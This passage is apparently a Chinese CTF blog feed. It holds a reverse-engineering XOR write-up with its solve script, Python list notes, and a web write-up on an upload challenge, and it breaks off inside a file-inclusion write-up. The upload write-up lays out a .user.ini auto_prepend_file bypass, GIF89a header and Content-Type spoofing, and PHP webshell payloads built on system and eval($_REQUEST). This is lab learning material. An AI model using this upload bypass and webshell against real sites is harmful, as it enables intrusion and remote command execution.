class="hljs-number">0</span>x51, <span class="hljs-number">0</span>x09, <span class="hljs-number">0</span>x46, <span class="hljs-number">0</span>x17, <span class="hljs-number">0</span>x46, <span class="hljs-number">0</span>x54, <span class="hljs-number">0</span>x5A, <span class="hljs-number">0</span>x59, <span class="hljs-number">0</span>x59, <span class="hljs-number">0</span>x1F, <span class="hljs-number">0</span>x48, <span class="hljs-number">0</span>x32, <span class="hljs-number">0</span>x5B, <span class="hljs-number">0</span>x6B, <span class="hljs-number">0</span>x7C, <span class="hljs-number">0</span>x75, <span class="hljs-number">0</span>x6E, <span class="hljs-number">0</span>x7E, <span class="hljs-number">0</span>x6E, <span class="hljs-number">0</span>x2F, <span class="hljs-number">0</span>x77, <span class="hljs-number">0</span>x4F, <span class="hljs-number">0</span>x7A, <span class="hljs-number">0</span>x71, <span class="hljs-number">0</span>x43, <span class="hljs-number">0</span>x2B, <span class="hljs-number">0</span>x26, <span class="hljs-number">0</span>x89, <span class="hljs-number">0</span>xFE, <span class="hljs-number">0</span>x00<br></code></pre></td></tr></tbody></table></figure><p>查看main函数伪代码：</p><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">__int64 __fastcall main(__int64 a1, <span class="hljs-built_in">char</span> **a2, <span class="hljs-built_in">char</span> **a3)<br>{<br>  __int64 result; <span class="hljs-comment">// rax@4</span><br>  __int64 v4; <span class="hljs-comment">// rsi@4</span><br>  signed <span class="hljs-built_in">int</span> i; <span class="hljs-comment">// [sp+Ch] [bp-34h]@1</span><br>  <span class="hljs-built_in">char</span> s<span class="hljs-literal">[<span class="hljs-number">40</span>]</span>; <span class="hljs-comment">// [sp+10h] [bp-30h]@1</span><br>  __int64 v7; <span class="hljs-comment">// [sp+38h] [bp-8h]@1</span><br>  v7 = *<span class="hljs-constructor">MK_FP(<span class="hljs-params">__FS__</span>, 40LL)</span>;    <span class="hljs-comment">// v7 8字节，我也不知道啥功能</span><br>  sub<span class="hljs-constructor">_A90((<span class="hljs-params">__int64</span>)</span>sub_916);<br>  fgets(s, <span class="hljs-number">35</span>, stdin);          <span class="hljs-comment">// 从stdin中读取35个存储到s</span><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">33</span>; ++i )<br>    s1<span class="hljs-literal">[(<span class="hljs-identifier">signed</span> <span class="hljs-identifier">__int64</span>)<span class="hljs-identifier">i</span>]</span> ^= s<span class="hljs-literal">[<span class="hljs-identifier">i</span>]</span>;  <span class="hljs-comment">// s1和s异或，值传给s1</span><br>  result = <span class="hljs-number">0L</span>L;<br>  v4 = *<span class="hljs-constructor">MK_FP(<span class="hljs-params">__FS__</span>, 40LL)</span> ^ v7;<br>  return result;<br>}<br></code></pre></td></tr></tbody></table></figure><p>不知道这玩意儿啥意思，看一下main流程图吧：</p><p><img src="https://s2.loli.net/2022/08/19/iDpxFBfYdAgG9Qj.png" alt="图片.png"></p><p>s1和s2异或，然后跟s比较，一样就Congratulations，</p><p>那就s1和s2异或一下呗。</p><p>但还是不行，查看了一下官方wp,发现还有另一个异或，没找到，很迷，先贴一下官方exp吧。</p><p>exp:</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">s2</span>=[ <span class="hljs-number">0</span>x56, <span class="hljs-number">0</span>x4E, <span class="hljs-number">0</span>x57, <span class="hljs-number">0</span>x58, <span class="hljs-number">0</span>x51, <span class="hljs-number">0</span>x51, <span class="hljs-number">0</span>x09, <span class="hljs-number">0</span>x46, <span class="hljs-number">0</span>x17, <span class="hljs-number">0</span>x46, <br>  <span class="hljs-attribute">0x54</span>, <span class="hljs-number">0</span>x5A, <span class="hljs-number">0</span>x59, <span class="hljs-number">0</span>x59, <span class="hljs-number">0</span>x1F, <span class="hljs-number">0</span>x48, <span class="hljs-number">0</span>x32, <span class="hljs-number">0</span>x5B, <span class="hljs-number">0</span>x6B, <span class="hljs-number">0</span>x7C, <br>  <span class="hljs-attribute">0x75</span>, <span class="hljs-number">0</span>x6E, <span class="hljs-number">0</span>x7E, <span class="hljs-number">0</span>x6E, <span class="hljs-number">0</span>x2F, <span class="hljs-number">0</span>x77, <span class="hljs-number">0</span>x4F, <span class="hljs-number">0</span>x7A, <span class="hljs-number">0</span>x71, <span class="hljs-number">0</span>x43, <br>  <span class="hljs-attribute">0x2B</span>, <span class="hljs-number">0</span>x26, <span class="hljs-number">0</span>x89, <span class="hljs-number">0</span>xFE, <span class="hljs-number">0</span>x00]<br><span class="hljs-attribute">s1</span> = 'qasxcytgsasxcvrefghnrfghnjedfgbhn'<br><span class="hljs-attribute">print</span>(len(s1))<br><span class="hljs-attribute">for</span> i in range(len(s1)+<span class="hljs-number">1</span>):<br> <span class="hljs-attribute">print</span>(chr(ord(s1[i])^ (<span class="hljs-number">2</span> * i + <span class="hljs-number">65</span>)^s2[i]),end='')<br> <span class="hljs-comment"># flag{c0n5truct0r5_functi0n_in_41f}</span><br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;xor 异或逻辑运算：相同为0，不同为1&lt;/p&gt;
&lt;p&gt;ida64打开，找到关键字符串&lt;code&gt;Congratulations&lt;/code&gt;,点进去查看伪代码&lt;/p&gt;
&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td </summary>
      
    
    
    
    
    <category term="RE" scheme="https://sinky.top/tags/RE/"/>
    
    <category term="CTF" scheme="https://sinky.top/tags/CTF/"/>
    
    <category term="攻防世界" scheme="https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
  </entry>
  
  <entry>
    <title>Python学习3</title>
    <link href="https://sinky.top/2022/08/18/python%E5%AD%A6%E4%B9%A03/"/>
    <id>https://sinky.top/2022/08/18/python%E5%AD%A6%E4%B9%A03/</id>
    <published>2022-08-18T10:07:24.521Z</published>
    <updated>2022-08-18T11:44:46.298Z</updated>
    
    <content type="html"><![CDATA[<h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><p>变量可以存储一个元素，而列表是可以存储多个元素，程序可以方便的对这些数据进行整体操作。</p><p>（相当于数组）</p><p>eg:</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">a</span>=10<br>list=[<span class="hljs-string">'hello'</span>,<span class="hljs-string">'world'</span>,98]<br><span class="hljs-built_in">print</span>(id(list)) # 2957481570240<br><span class="hljs-built_in">print</span>(type(list)) # &lt;class <span class="hljs-string">'list'</span>&gt;<br><span class="hljs-built_in">print</span>(list) # [<span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>, 98]<br></code></pre></td></tr></tbody></table></figure><h2 id="创建列表"><a href="#创建列表" class="headerlink" title="创建列表"></a>创建列表</h2><p>1、使用中括号[]，英文逗号分隔，调用内置函数list()</p><p>2、特点：</p><ul><li>有序排序</li><li>索引映射唯一一个数据</li><li>可存储重复数据</li><li>任意数据类型混存</li><li>根据需要动态分配和回收内存</li></ul><p>eg:</p><figure class="highlight prolog"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs prolog">list=[<span class="hljs-string">'hello'</span>,<span class="hljs-string">'world'</span>,<span class="hljs-number">98</span>] <br>print(list) # [<span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>, <span class="hljs-number">98</span>]<br>print(list[<span class="hljs-number">0</span>],list[<span class="hljs-number">-3</span>]) # hello hello<br></code></pre></td></tr></tbody></table></figure><h2 id="列表查询"><a href="#列表查询" class="headerlink" title="列表查询"></a>列表查询</h2><h3 id="获取指定元素索引-index"><a href="#获取指定元素索引-index" class="headerlink" title="获取指定元素索引 index()"></a>获取指定元素索引 <code>index()</code></h3><ul><li>列表中有相同元素，只返回第一个元素的索引</li><li>查询元素不存在返回error</li><li>可指定范围</li></ul><p>eg:</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">list=<span class="hljs-selector-attr">[<span class="hljs-string">'hello'</span>,<span class="hljs-string">'world'</span>,98,<span class="hljs-string">'hello'</span>]</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(list.index(<span class="hljs-string">'hello'</span>)</span></span>) #<span class="hljs-number">0</span><br> <span class="hljs-selector-id">#print</span>(list<span class="hljs-selector-class">.index</span>(<span class="hljs-string">'hello'</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)) #<span class="hljs-string">'world'</span>,<span class="hljs-number">98</span>,范围内无<span class="hljs-string">'hello'</span>，返回error<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(list.index(<span class="hljs-string">'hello'</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>)</span></span>) #<span class="hljs-number">3</span><br></code></pre></td></tr></tbody></table></figure><h3 id="获取列表中的单个元素"><a href="#获取列表中的单个元素" class="headerlink" title="获取列表中的单个元素"></a>获取列表中的单个元素</h3><ul><li>正向，从0到n-1，eg:<code>list[0]</code></li><li>逆向，从-n到-1，eg:<code>list[-n]</code></li><li>不存在，error</li></ul><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">list=<span class="hljs-selector-attr">[<span class="hljs-string">'hello'</span>,<span class="hljs-string">'world'</span>,98,<span class="hljs-string">'hello'</span>,324]</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(list[<span class="hljs-number">2</span>])</span></span> #<span class="hljs-number">98</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(list[-<span class="hljs-number">3</span>])</span></span> #<span class="hljs-number">98</span><br> <span class="hljs-selector-id">#print</span>(list<span class="hljs-selector-attr">[-8]</span>) #error<br></code></pre></td></tr></tbody></table></figure><h3 id="获取列表中的多个元素"><a href="#获取列表中的多个元素" class="headerlink" title="获取列表中的多个元素"></a>获取列表中的多个元素</h3><p>列表名[start:stop:step]</p><p>eg:</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">list1</span>=[<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>,<span class="hljs-number">50</span>,<span class="hljs-number">60</span>,<span class="hljs-number">70</span>,<span class="hljs-number">80</span>]<br><span class="hljs-attribute">list2</span>=list1[<span class="hljs-number">1</span>:<span class="hljs-number">6</span>:<span class="hljs-number">1</span>]<br><span class="hljs-attribute">print</span>(list2) #<span class="hljs-meta"> [20, 30, 40, 50, 60]</span><br><span class="hljs-attribute">print</span>(list1[<span class="hljs-number">1</span>:<span class="hljs-number">6</span>])<br><span class="hljs-attribute">print</span>(list1[<span class="hljs-number">1</span>:<span class="hljs-number">6</span>:])<br><span class="hljs-attribute">print</span>(list1[<span class="hljs-number">1</span>:<span class="hljs-number">6</span>:<span class="hljs-number">2</span>]) #<span class="hljs-meta"> [20, 40, 60]</span><br><span class="hljs-attribute">print</span>(list1[:<span class="hljs-number">6</span>:<span class="hljs-number">2</span>]) #<span class="hljs-meta"> [10, 30, 50]</span><br> <span class="hljs-comment">#step为负数</span><br><span class="hljs-attribute">print</span>(list1[::-<span class="hljs-number">1</span>]) #<span class="hljs-meta"> [80, 70, 60, 50, 40, 30, 20, 10]</span><br><span class="hljs-attribute">print</span>(list1[<span class="hljs-number">7</span>::-<span class="hljs-number">1</span>]) #<span class="hljs-meta"> [80, 70, 60, 50, 40, 30, 20, 10]</span><br><span class="hljs-attribute">print</span>(list1[<span class="hljs-number">6</span>:<span class="hljs-number">0</span>:-<span class="hljs-number">2</span>]) #<span class="hljs-meta"> [70, 50, 30]</span><br></code></pre></td></tr></tbody></table></figure><h3 id="判断元素在列表中是否存在"><a href="#判断元素在列表中是否存在" class="headerlink" title="判断元素在列表中是否存在"></a>判断元素在列表中是否存在</h3><p><code>元素 in/not in 列表</code></p><p>列表元素的遍历：<code>for 迭代变量 in 列表名：  操作</code></p><p>eg: </p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">list=[10,20,<span class="hljs-string">'python'</span>,<span class="hljs-string">'hello'</span>]<br><span class="hljs-built_in">print</span>(10 <span class="hljs-keyword">in</span> list) # <span class="hljs-literal">True</span><br><span class="hljs-built_in">print</span>(100 <span class="hljs-keyword">in</span> list) # <span class="hljs-literal">False</span><br><span class="hljs-built_in">print</span>(10 <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> list) # <span class="hljs-literal">False</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> list:<br>    <span class="hljs-built_in">print</span>(i) #10 20 python hello<br></code></pre></td></tr></tbody></table></figure><h2 id="列表增加"><a href="#列表增加" class="headerlink" title="列表增加"></a>列表增加</h2><ul><li>append() 在列表末尾添加一个元素</li><li>extend() 在列表末尾至少添加一个元素</li><li>insert() 在列表任意位置添加一个位置</li><li>切片 在任意位置至少添加一个元素</li></ul><p>eg:</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros">list=[10,20,30]<br>list.append(100)<br><span class="hljs-built_in">print</span>(list) #[10,20,30,100]<br>list2=[<span class="hljs-string">'hello'</span>,<span class="hljs-string">'world'</span>]<br>list.append(list2)<br><span class="hljs-built_in">print</span>(list) # [10, 20, 30, 100, [<span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>]]<br>list.extend(list2)<br><span class="hljs-built_in">print</span>(list) # [10, 20, 30, 100, [<span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>], <span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>] <br>list.insert(1,90)<br><span class="hljs-built_in">print</span>(list) # [10, 90, 20, 30, 100, [<span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>], <span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>]<br>list3=[<span class="hljs-literal">True</span>,<span class="hljs-literal">False</span>,<span class="hljs-string">'hello'</span>]<br>list[1:]=list3<br><span class="hljs-built_in">print</span>(list) # [10, <span class="hljs-literal">True</span>, <span class="hljs-literal">False</span>, <span class="hljs-string">'hello'</span>]<br></code></pre></td></tr></tbody></table></figure><h2 id="列表删除"><a href="#列表删除" class="headerlink" title="列表删除"></a>列表删除</h2><ul><li>remove() 一次删一个；重复元素只删第一个；元素不存在返回error</li><li>pop() 删除一个指定索引位置上的元素；指定索引不存在返回error;不指定索引，删除列表中最后一个元素</li><li>切片 一次至少删除一个元素</li><li>clear() 清空列表</li><li>del 删除列表</li></ul><p>eg:</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs routeros">list=[10,20,30,40,50,60,30]<br>list.<span class="hljs-built_in">remove</span>(30)<br><span class="hljs-built_in">print</span>(list) # [10, 20, 40, 50, 60, 30]<br>list.pop()<br><span class="hljs-built_in">print</span>(list) # [10, 20, 40, 50, 60]<br>list.pop(1)<br><span class="hljs-built_in">print</span>(list) # [10, 40, 50, 60]<br><span class="hljs-attribute">new_list</span>=list[1:3]<br><span class="hljs-built_in">print</span>(list) # [10, 40, 50, 60]<br><span class="hljs-built_in">print</span>(new_list) # [40, 50]<br> #不产生新的列表，直接删除原列表内容<br>list[1:3]=[]<br><span class="hljs-built_in">print</span>(list) # [10, 60]<br>list.clear()<br><span class="hljs-built_in">print</span>(list) # []<br> #del 删除列表<br>del list<br><span class="hljs-built_in">print</span>(list)<br><span class="hljs-built_in">print</span>(list) # &lt;class <span class="hljs-string">'list'</span>&gt;<br></code></pre></td></tr></tbody></table></figure><h2 id="列表修改"><a href="#列表修改" class="headerlink" title="列表修改"></a>列表修改</h2><ul><li>为指定索引的元素赋予一个新值</li><li>为指定的切片赋予一个新值</li></ul><p>eg:</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">list</span>=[<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>]<br><span class="hljs-attribute">list</span>[<span class="hljs-number">2</span>]=<span class="hljs-number">100</span><br><span class="hljs-attribute">print</span>(list) #<span class="hljs-meta"> [10, 20, 100, 40]</span><br><span class="hljs-attribute">list</span>[<span class="hljs-number">1</span>:<span class="hljs-number">3</span>]=[<span class="hljs-number">300</span>,<span class="hljs-number">400</span>,<span class="hljs-number">500</span>]<br><span class="hljs-attribute">print</span>(list) #<span class="hljs-meta"> [10, 300, 400, 500, 40]</span><br></code></pre></td></tr></tbody></table></figure><h2 id="列表排序"><a href="#列表排序" class="headerlink" title="列表排序"></a>列表排序</h2><ul><li>调用sort(),列中所有元素默认按照从小到大顺序进行排序，可以指定reverse=True进行降序。</li><li>调用内置函数sorted(),可以指定reverse=True进行降序排序，原列表不发生变化（产生新列表）</li></ul><p>eg:</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">list=[20,40,10,98,45]<br>list.sort()<br><span class="hljs-built_in">print</span>(list) # [10, 20, 40, 45, 98]<br> #降序<br>list.sort(<span class="hljs-attribute">reverse</span>=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(list) # [98, 45, 40, 20, 10]<br>list.sort(<span class="hljs-attribute">reverse</span>=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(list) # [10, 20, 40, 45, 98]<br></code></pre></td></tr></tbody></table></figure><p>eg:</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">list</span>=[<span class="hljs-number">20</span>,<span class="hljs-number">40</span>,<span class="hljs-number">10</span>,<span class="hljs-number">98</span>,<span class="hljs-number">45</span>]<br>new_list=<span class="hljs-built_in">sorted</span>(<span class="hljs-built_in">list</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>) <span class="hljs-comment"># [20, 40, 10, 98, 45]</span><br><span class="hljs-built_in">print</span>(new_list) <span class="hljs-comment"># [10, 20, 40, 45, 98]</span><br> <span class="hljs-comment">#降序</span><br>desc_list=<span class="hljs-built_in">sorted</span>(<span class="hljs-built_in">list</span>,reverse=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(desc_list) <span class="hljs-comment"># [98, 45, 40, 20, 10]</span><br></code></pre></td></tr></tbody></table></figure><h2 id="列表生成式"><a href="#列表生成式" class="headerlink" title="列表生成式"></a>列表生成式</h2><p><code>[列表元素的表达式 for i in range(1,10)]</code></p><p>eg：</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">l</span>=[i for i in range(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>)]<br><span class="hljs-attribute">print</span>(l) #<span class="hljs-meta"> [1, 2, 3, 4, 5, 6, 7, 8, 9]</span><br><span class="hljs-attribute">l2</span>=[ i*<span class="hljs-number">2</span> for i in range(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>)]<br><span class="hljs-attribute">print</span>(l2) #<span class="hljs-meta"> [2, 4, 6, 8, 10]</span><br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;列表&quot;&gt;&lt;a href=&quot;#列表&quot; class=&quot;headerlink&quot; title=&quot;列表&quot;&gt;&lt;/a&gt;列表&lt;/h1&gt;&lt;p&gt;变量可以存储一个元素，而列表是可以存储多个元素，程序可以方便的对这些数据进行整体操作。&lt;/p&gt;
&lt;p&gt;（相当于数组）&lt;/p&gt;
&lt;p&gt;eg:&lt;</summary>
      
    
    
    
    
    <category term="python" scheme="https://sinky.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界web-easyupload</title>
    <link href="https://sinky.top/2022/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-easyupload/"/>
    <id>https://sinky.top/2022/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-easyupload/</id>
    <published>2022-08-17T06:58:13.030Z</published>
    <updated>2022-08-17T15:07:24.305Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述:"></a>题目描述:</h1><p>一名合格的黑客眼中，所有的上传点都是开发者留下的后门</p><p><img src="https://s2.loli.net/2022/08/17/ixpUIAyNQBwCkO2.png" alt="图片.png"></p><p>上传文件后返回文件路径了。</p><p>尝试修改后缀为.php，上传失败。</p><p>新建一个txt文件，内容为：</p><figure class="highlight nginx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">GIF89a</span><br>abc.jpg<br></code></pre></td></tr></tbody></table></figure><p>然后文件名改成a.jpg</p><p>上传成功。</p><p><img src="https://s2.loli.net/2022/08/17/Yvi2QP7humpFBAw.png" alt="图片.png"></p><p>（注：我以为是带着jpg的头文件就可以用一句话木马了，结果蚁剑连着的时候数据为空，是我天真了，果断看官方wp）</p><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>利用文件上传漏洞点，通过绕过服务器的安全防护，达到getshell的目的，主要考察利用fastcgi的.user.ini特性进行任意命令执行</p><p>有关利用.usr.ini构建php后门，博文贴：</p><p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p><h2 id="绕过的点："><a href="#绕过的点：" class="headerlink" title="绕过的点："></a>绕过的点：</h2><ul><li>检查文件是否有php字符串<ul><li>可以利用段标签绕过，例如<code>&lt;?=phpinfo();?&gt;</code></li></ul></li><li>检查后缀中是否有htaccess或ph<ul><li>可以通过上传.user.ini以及正常jpg文件来进行getshell，在服务器中只要运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。这个文件是php.ini的补充文件，当网页访问的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini,并作为cgi的启动项。</li><li>其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制，比如<code>auto+prepend_file</code></li></ul></li><li>检查文件头部信息<ul><li>绕过方式即在文件头部添加一个图片的文件头，比如<code>GIF89a</code></li></ul></li><li>文件MIME类型<ul><li>绕过方法即修改上传时的Content-Type</li></ul></li></ul><p>新建文件更名为.user.ini，内容为</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GIF89a<br><span class="hljs-attribute">auto_prepend_file</span>=a.jpg<br></code></pre></td></tr></tbody></table></figure><p>上传.user.ini，bp抓包，更改Content-Type为<code>image/jpg</code>,放包，显示上传成功。</p><p><img src="https://s2.loli.net/2022/08/17/eaqHKAEVGvypFcB.png" alt="图片.png"></p><p>新建文件更名为a.jpg，内容为</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">GIF89a<br><span class="hljs-meta">&lt;?</span>=<span class="hljs-keyword">system</span>(<span class="hljs-string">'cat /flag);?&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>上传成功，蚁剑连接，找到flag:</p><p><img src="https://s2.loli.net/2022/08/17/ovweEJS9kI1NDZG.png" alt="图片.png"></p><p>不知道为什么，官方给的payload上传之后500报错，换了一个payload成功了：</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'cmd'</span>]);<span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></tbody></table></figure><p><img src="https://s2.loli.net/2022/08/17/mbTtcXO3wzKF8G6.png" alt="图片.png"></p><pre><code class="hljs">cyberpeace{6ed12a66909f053b9bc1799622c9ce7e}</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述:&quot;&gt;&lt;/a&gt;题目描述:&lt;/h1&gt;&lt;p&gt;一名合格的黑客眼中，所有的上传点都是开发者留下的后门&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://s2.loli.</summary>
      
    
    
    
    
    <category term="ctf" scheme="https://sinky.top/tags/ctf/"/>
    
    <category term="WEB" scheme="https://sinky.top/tags/WEB/"/>
    
    <category term="攻防世界" scheme="https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    <category term="文件上传漏洞" scheme="https://sinky.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界web-fileinclude</title>
    <link href="https://sinky.top/2022/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-fileinclude/"/>
    <id>https://sinky.top/2022/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb-fileinclude/</id>
    <published>2022-08-17T03:31:33.308Z</published>
    <updated>2022-08-17T04:41:04.152Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://s2.loli.net/2022/08/17/dhX79DGxo4rptkT.png" alt="图片.png"></p><p>题目告知flag在flag.php里，分析源代码：</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>( !<span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">'display_errors'</span>) ) {<br>  <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'display_errors'</span>, <span class="hljs-string">'On'</span>); <span class="hljs-comment"># 打开报错提示</span><br>  }<br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL); <span class="hljs-comment">#设置php的报错级别为所有的错误和警告，并返回当前级别</span><br><span class="hljs-variable">$lan</span> = <span 